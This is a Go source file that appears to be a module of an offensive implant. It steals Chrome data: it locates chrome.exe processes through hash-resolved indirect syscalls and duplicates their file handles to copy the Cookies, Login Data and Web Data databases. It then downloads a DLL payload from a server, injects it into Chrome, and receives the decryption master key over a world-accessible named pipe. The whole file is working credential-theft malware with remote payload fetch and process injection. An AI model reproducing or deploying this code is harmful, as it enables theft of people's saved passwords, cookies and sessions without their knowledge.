package chrome

import (
	"encoding/hex"
	"fmt"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/carved4/carved/implant/pkg/modules/loader"
	"github.com/carved4/carved/implant/pkg/transport"

	wc "github.com/carved4/go-wincall"
)

type RawFile struct {
	Name    string
	Data    []byte
	Profile string
}

type ExtractionResult struct {
	MasterKey []byte
	Files     []RawFile
}

var (
	ntdllBase        = wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	queryProcess     = wc.GetSyscall(wc.GetHash("NtQueryInformationProcess"))
	querySystem      = wc.GetSyscall(wc.GetHash("NtQuerySystemInformation"))
	queryObject      = wc.GetSyscall(wc.GetHash("NtQueryObject"))
	closeHandleNt    = wc.GetSyscall(wc.GetHash("NtClose"))
	ntReadFile       = wc.GetSyscall(wc.GetHash("NtReadFile"))
	queryFileInfo    = wc.GetSyscall(wc.GetHash("NtQueryInformationFile"))
	setFileInfo      = wc.GetSyscall(wc.GetHash("NtSetInformationFile"))
	duplicateObject  = wc.GetSyscall(wc.GetHash("NtDuplicateObject"))
	openProcess      = wc.GetSyscall(wc.GetHash("NtOpenProcess"))
	createFile       = wc.GetSyscall(wc.GetHash("NtCreateFile"))
	writeFile        = wc.GetSyscall(wc.GetHash("NtWriteFile"))
	createThread     = wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlCreateUserThread"))
	k32base          = wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	closeHandle      = wc.GetFunctionAddress(k32base, wc.GetHash("CloseHandle"))
	createNamedPipeW = wc.GetFunctionAddress(k32base, wc.GetHash("CreateNamedPipeW"))
	connectNamedPipe = wc.GetFunctionAddress(k32base, wc.GetHash("ConnectNamedPipe"))
	ReadFile         = wc.GetFunctionAddress(k32base, wc.GetHash("ReadFile"))
)

type Handle struct {
	Val             uintptr
	HandleCount     uintptr
	PointerCount    uintptr
	GrantedAccess   uint32
	ObjectTypeIndex uint32
	HandleAttr      uint32
	Reserved        uint32
}

type Snapshot struct {
	Total uintptr
	_     uintptr
}

type ObjType struct {
	Name  WideStr
	Count uint32
	Total uint32
}

type WideStr struct {
	Size  uint16
	MaxSz uint16
	Data  *uint16
}

type SystemProcessInfo struct {
	NextEntryOffset uint32
	NumberOfThreads uint32
	Reserved1       [48]byte
	ImageName       WideStr
	BasePriority    int32
	UniqueProcessId uintptr
	Reserved2       uintptr
	HandleCount     uint32
	SessionId       uint32
	Reserved3       uintptr
	PeakVirtualSize uintptr
	VirtualSize     uintptr
	Reserved4       uint32
	PeakWorkingSet  uintptr
	WorkingSet      uintptr
	Reserved5       uintptr
	QuotaPagedPool  uintptr
	Reserved6       uintptr
	QuotaNonPaged   uintptr
	PagefileUsage   uintptr
	PeakPagefile    uintptr
	PrivateUsage    uintptr
	Reserved7       [6]uintptr
}

type IoStatusBlock struct {
	Status uintptr
	Info   uintptr
}

type FileStandardInfo struct {
	AllocationSize int64
	EndOfFile      int64
	NumberOfLinks  uint32
	DeletePending  byte
	Directory      byte
}

type FilePositionInfo struct {
	CurrentByteOffset int64
}

type FileNameInfo struct {
	FileNameLength uint32
	FileName       [1]uint16
}

type ObjectAttributes struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               *WideStr
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

const (
	pipeAccessDuplex    = 0x3
	pipeTypeMessage     = 0x4
	pipeReadmodeMessage = 0x2
	pipeWait            = 0x0
	invalidHandleValue  = ^uintptr(0)
)

var pipeName string = `\\.\pipe\chromepipe`

const (
	fileReadData   = 0x0001
	fileWriteData  = 0x0002
	fileAppendData = 0x0004
	fileReadEA     = 0x0008
	fileWriteEA    = 0x0010
	fileReadAttr   = 0x0080
	fileWriteAttr  = 0x0100
	readControl    = 0x20000
	synchronize    = 0x100000
	processVmOp    = 0x0008
	processVmRead  = 0x0010
	processVmWrite = 0x0020

	statusMismatch = 0xC0000004
	statusSuccess  = 0x00000000
	queryInfo      = 0x0400
	dupHandle      = 0x0040
	handleClass    = 51
	typeClass      = 2
	normalAttr     = 0x80

	fileStandardInfo = 5
	filePositionInfo = 14
	fileNameInfo     = 9
)

type securityAttributes struct {
	nLength              uint32
	lpSecurityDescriptor uintptr
	bInheritHandle       int32
}

func createPipeServer() uintptr {
	pipeNamePtr, _ := wc.UTF16ptr(pipeName)

	advapi32 := wc.LoadLibraryLdr("advapi32.dll")
	convertStringSdToSd := wc.GetFunctionAddress(advapi32, wc.GetHash("ConvertStringSecurityDescriptorToSecurityDescriptorW"))
	localFree := wc.GetFunctionAddress(k32base, wc.GetHash("LocalFree"))

	sddl, _ := wc.UTF16ptr("D:(A;;GA;;;WD)")
	var pSD uintptr

	ret, _, _ := wc.CallG0(convertStringSdToSd,
		uintptr(unsafe.Pointer(sddl)),
		uintptr(1),
		uintptr(unsafe.Pointer(&pSD)),
		uintptr(0),
	)

	var sa *securityAttributes
	if ret != 0 && pSD != 0 {
		sa = &securityAttributes{
			nLength:              uint32(unsafe.Sizeof(securityAttributes{})),
			lpSecurityDescriptor: pSD,
			bInheritHandle:       0,
		}
	}

	var saPtr uintptr
	if sa != nil {
		saPtr = uintptr(unsafe.Pointer(sa))
	}

	hPipe, _, _ := wc.CallG0(createNamedPipeW,
		uintptr(unsafe.Pointer(pipeNamePtr)),
		uintptr(pipeAccessDuplex),
		uintptr(pipeTypeMessage|pipeReadmodeMessage|pipeWait),
		uintptr(1),
		uintptr(4096),
		uintptr(4096),
		uintptr(0),
		saPtr,
	)

	if pSD != 0 {
		wc.CallG0(localFree, pSD)
	}

	return hPipe
}

func Extract(serverURL string) (*ExtractionResult, error) {
	config := &ExtractionResult{
		Files: []RawFile{},
	}

	chromeProcs, err := ScanProcesses("chrome.exe")
	if err != nil {
		return nil, fmt.Errorf("scan processes: %w", err)
	}

	var targetPID uint32
	var foundHandles = make([]struct {
		handle uintptr
		pid    uint32
		path   string
		dbType string
	}, 0)

	for pid, handles := range chromeProcs {
		for _, h := range handles {
			type extractResult struct {
				data []byte
				path string
				err  error
			}
			resultChan := make(chan extractResult, 1)

			go func(handle uintptr, procPID uint32) {
				data, path, err := ExtractFile(handle, procPID)
				resultChan <- extractResult{data, path, err}
			}(h.Val, pid)

			var path string
			var err error

			select {
			case result := <-resultChan:
				path = result.path
				err = result.err
			case <-time.After(100 * time.Millisecond):
				continue
			}

			if err != nil {
				continue
			}

			var dbType string
			if strings.HasSuffix(path, "\\Cookies") || strings.HasSuffix(path, "\\Network\\Cookies") {
				dbType = "Cookies"
			} else if strings.HasSuffix(path, "\\Login Data") {
				dbType = "Login Data"
			} else if strings.HasSuffix(path, "\\Web Data") {
				dbType = "Web Data"
			}

			if dbType != "" {
				foundHandles = append(foundHandles, struct {
					handle uintptr
					pid    uint32
					path   string
					dbType string
				}{h.Val, pid, path, dbType})
				if targetPID == 0 {
					targetPID = pid
				}
			}
		}
	}

	if len(foundHandles) == 0 {
		return nil, fmt.Errorf("no chrome process found with required DB handles")
	}

	for i, info := range foundHandles {
		data, _, err := ExtractFile(info.handle, info.pid)
		if err != nil {
			continue
		}

		profile := extractProfileName(info.path)

		safeType := strings.ReplaceAll(info.dbType, " ", "_")
		filename := fmt.Sprintf("chrome_%s_%d_%d.db", safeType, info.pid, i)

		config.Files = append(config.Files, RawFile{
			Name:    filename,
			Data:    data,
			Profile: profile,
		})
	}

	if len(config.Files) == 0 {
		return nil, fmt.Errorf("failed to extract any database files")
	}

	hPipe := createPipeServer()
	if hPipe == invalidHandleValue || hPipe == 0 {
		return nil, fmt.Errorf("CreateNamedPipeW failed")
	}

	var clientId struct {
		pid uintptr
		tid uintptr
	}
	clientId.pid = uintptr(targetPID)

	var objAttr ObjectAttributes
	objAttr.Length = uint32(unsafe.Sizeof(objAttr))

	var hProcess uintptr
	r, _ := wc.IndirectSyscall(
		openProcess.SSN,
		openProcess.Address,
		uintptr(unsafe.Pointer(&hProcess)),
		uintptr(processVmOp|processVmRead|processVmWrite|0x0002),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&clientId)),
	)

	if r != statusSuccess {
		wc.CallG0(closeHandle, hPipe)
		return nil, fmt.Errorf("failed to open target chrome process: %x", r)
	}

	dllURL := serverURL + "/payloads/gobound.dll"
	dllBytes, err := transport.Download(dllURL)
	if err != nil {
		wc.CallG0(closeHandle, hPipe)
		wc.CallG0(closeHandle, hProcess)
		return nil, fmt.Errorf("download gobound.dll: %w", err)
	}

	if err := loader.LoadDLLRemote(hProcess, dllBytes); err != nil {
		wc.CallG0(closeHandle, hPipe)
		wc.CallG0(closeHandle, hProcess)
		return nil, fmt.Errorf("inject DLL: %w", err)
	}
	wc.CallG0(connectNamedPipe, hPipe, uintptr(0))

	var masterKey []byte
	buf := make([]byte, 4096)
	for {
		var bytesRead uint32
		ret, _, _ := wc.CallG0(ReadFile,
			hPipe,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&bytesRead)),
			uintptr(0),
		)

		if ret == 0 {
			break
		}
		if bytesRead == 0 {
			continue
		}
		msgLen := bytesRead
		if msgLen > 0 && buf[msgLen-1] == 0 {
			msgLen--
		}
		msg := string(buf[:msgLen])
		if strings.HasPrefix(msg, "KEY:") {
			keyHex := strings.TrimPrefix(msg, "KEY:")
			masterKey, err = hex.DecodeString(keyHex)
			if err != nil {
				wc.CallG0(closeHandle, hPipe)
				wc.CallG0(closeHandle, hProcess)
				return nil, fmt.Errorf("decode master key: %w", err)
			}
		} else if msg == "DONE" {
			break
		}
	}

	wc.CallG0(closeHandle, hPipe)
	wc.CallG0(closeHandle, hProcess)

	if len(masterKey) == 0 {
		return nil, fmt.Errorf("failed to retrieve master key from DLL")
	}

	config.MasterKey = masterKey
	return config, nil
}

func extractProfileName(path string) string {
	parts := strings.Split(path, "\\")
	for i, part := range parts {
		if part == "User Data" && i+1 < len(parts) {
			profile := parts[i+1]
			return profile
		}
	}
	return "Default"
}

func ScanProcesses(target string) (map[uint32][]Handle, error) {
	procs := make(map[uint32][]Handle)

	var bufLen uint32 = 1024 * 1024
	var mem []byte
	code := uint32(statusMismatch)

	for code == statusMismatch {
		mem = make([]byte, bufLen)
		r, _ := wc.IndirectSyscall(
			querySystem.SSN,
			querySystem.Address,
			5,
			uintptr(unsafe.Pointer(&mem[0])),
			uintptr(bufLen),
			uintptr(unsafe.Pointer(&bufLen)),
		)
		code = uint32(r)
	}

	if code != statusSuccess {
		return nil, fmt.Errorf("query system failed: %x", code)
	}

	offset := uint32(0)
	for {
		if offset >= uint32(len(mem)) {
			break
		}

		info := (*SystemProcessInfo)(unsafe.Pointer(&mem[offset]))

		if info.UniqueProcessId != 0 && info.ImageName.Data != nil {
			sz := int(info.ImageName.Size / 2)
			if sz > 0 && sz < 512 {
				buf := (*[512]uint16)(unsafe.Pointer(info.ImageName.Data))[:sz:sz]
				name := syscall.UTF16ToString(buf)

				if strings.EqualFold(name, target) {
					pid := uint32(info.UniqueProcessId)

					var clientId struct {
						pid uintptr
						tid uintptr
					}
					clientId.pid = uintptr(pid)

					var objAttr ObjectAttributes
					objAttr.Length = uint32(unsafe.Sizeof(objAttr))

					var proc uintptr
					if r, _ := wc.IndirectSyscall(
						openProcess.SSN,
						openProcess.Address,
						uintptr(unsafe.Pointer(&proc)),
						uintptr(queryInfo|dupHandle),
						uintptr(unsafe.Pointer(&objAttr)),
						uintptr(unsafe.Pointer(&clientId)),
					); r == statusSuccess {

						var hBufLen uint32
						var hMem []byte
						hCode := uint32(statusMismatch)

						for hCode == statusMismatch {
							var p uintptr
							if hBufLen > 0 {
								hMem = make([]byte, hBufLen)
								p = uintptr(unsafe.Pointer(&hMem[0]))
							}

							r, _ := wc.IndirectSyscall(
								queryProcess.SSN,
								queryProcess.Address,
								uintptr(proc),
								handleClass,
								p, uintptr(hBufLen),
								uintptr(unsafe.Pointer(&hBufLen)),
							)
							hCode = uint32(r)
						}

						if hCode == statusSuccess && hBufLen >= uint32(unsafe.Sizeof(Snapshot{})) {
							snap := (*Snapshot)(unsafe.Pointer(&hMem[0]))
							n := snap.Total

							if n > 0 && hBufLen >= uint32(unsafe.Sizeof(Snapshot{})+uintptr(n)*unsafe.Sizeof(Handle{})) {
								off := unsafe.Sizeof(Snapshot{})
								items := make([]Handle, n)
								for i := uintptr(0); i < n; i++ {
									src := (*Handle)(unsafe.Pointer(uintptr(unsafe.Pointer(&hMem[0])) + off + i*unsafe.Sizeof(Handle{})))
									items[i] = *src
								}
								procs[pid] = items
							}
						}
						wc.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(proc))
					}
				}
			}
		}

		if info.NextEntryOffset == 0 {
			break
		}
		offset += info.NextEntryOffset
	}

	return procs, nil
}

func ExtractFile(hnd uintptr, owner uint32) ([]byte, string, error) {
	var clientId struct {
		pid uintptr
		tid uintptr
	}
	clientId.pid = uintptr(owner)

	var objAttr ObjectAttributes
	objAttr.Length = uint32(unsafe.Sizeof(objAttr))

	var proc uintptr
	if r, _ := wc.IndirectSyscall(
		openProcess.SSN,
		openProcess.Address,
		uintptr(unsafe.Pointer(&proc)),
		uintptr(dupHandle),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&clientId)),
	); r != statusSuccess {
		return nil, "", fmt.Errorf("access denied")
	}
	defer wc.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(proc))

	var dup uintptr
	self := ^uintptr(0)

	accessRights := fileReadData | fileWriteData | fileAppendData | fileReadEA | fileWriteEA | fileReadAttr | fileWriteAttr | readControl | synchronize
	if r, _ := wc.IndirectSyscall(duplicateObject.SSN, duplicateObject.Address, uintptr(proc), uintptr(hnd), self, uintptr(unsafe.Pointer(&dup)), uintptr(accessRights), 0, 0); r != statusSuccess {
		return nil, "", fmt.Errorf("dup error: %x", r)
	}
	defer wc.IndirectSyscall(closeHandleNt.SSN, closeHandleNt.Address, uintptr(dup))

	var bufLen uint32
	var mem []byte
	code := uint32(statusMismatch)

	for code == statusMismatch {
		var p uintptr
		if bufLen > 0 {
			mem = make([]byte, bufLen)
			p = uintptr(unsafe.Pointer(&mem[0]))
		}

		r, _ := wc.IndirectSyscall(queryObject.SSN, queryObject.Address, uintptr(dup), typeClass, p, uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
		code = uint32(r)
	}

	if code != statusSuccess {
		return nil, "", fmt.Errorf("query failed: %x", code)
	}

	obj := (*ObjType)(unsafe.Pointer(&mem[0]))
	if obj.Name.Data == nil {
		return nil, "", fmt.Errorf("no name")
	}

	sz := int(obj.Name.Size / 2)
	if sz > 256 {
		sz = 256
	}
	buf := (*[256]uint16)(unsafe.Pointer(obj.Name.Data))[:sz:sz]
	kind := syscall.UTF16ToString(buf)

	if kind != "File" {
		return nil, "", fmt.Errorf("wrong type: %s", kind)
	}

	var nameLen uint32 = 4096
	nameBuf := make([]byte, nameLen)
	var iosb IoStatusBlock

	r, _ := wc.IndirectSyscall(queryFileInfo.SSN, queryFileInfo.Address, uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(nameLen), fileNameInfo)
	if r != statusSuccess {
		return nil, "", fmt.Errorf("path error: %x", r)
	}

	nameInfo := (*FileNameInfo)(unsafe.Pointer(&nameBuf[0]))
	nameChars := int(nameInfo.FileNameLength / 2)
	if nameChars > 0 {
		namePtr := unsafe.Pointer(&nameInfo.FileName[0])
		nameBuf16 := (*[32768]uint16)(namePtr)[:nameChars:nameChars]
		fullpath := syscall.UTF16ToString(nameBuf16)

		if strings.HasPrefix(fullpath, "\\LOCAL\\") || strings.HasPrefix(fullpath, "\\Device\\NamedPipe") || strings.Contains(fullpath, "\\Device\\") {
			return nil, "", fmt.Errorf("skipped pipe")
		}

		var stdInfo FileStandardInfo
		iosb = IoStatusBlock{}

		if r, _ := wc.IndirectSyscall(queryFileInfo.SSN, queryFileInfo.Address, uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&stdInfo)), unsafe.Sizeof(stdInfo), fileStandardInfo); r != statusSuccess {
			return nil, fullpath, fmt.Errorf("size error: %x", r)
		}

		fsz := stdInfo.EndOfFile
		if fsz <= 0 {
			return nil, "", fmt.Errorf("empty file")
		}

		var posInfo FilePositionInfo
		posInfo.CurrentByteOffset = 0
		wc.IndirectSyscall(setFileInfo.SSN, setFileInfo.Address, uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&posInfo)), unsafe.Sizeof(posInfo), filePositionInfo)

		content := make([]byte, fsz)
		iosb = IoStatusBlock{}

		if r, _ := wc.IndirectSyscall(ntReadFile.SSN, ntReadFile.Address, uintptr(dup), 0, 0, 0, uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&content[0])), uintptr(fsz), 0, 0); r != statusSuccess {
			return nil, fullpath, fmt.Errorf("read error: %x", r)
		}

		return content[:iosb.Info], fullpath, nil
	}

	return nil, "", fmt.Errorf("no filename")
}
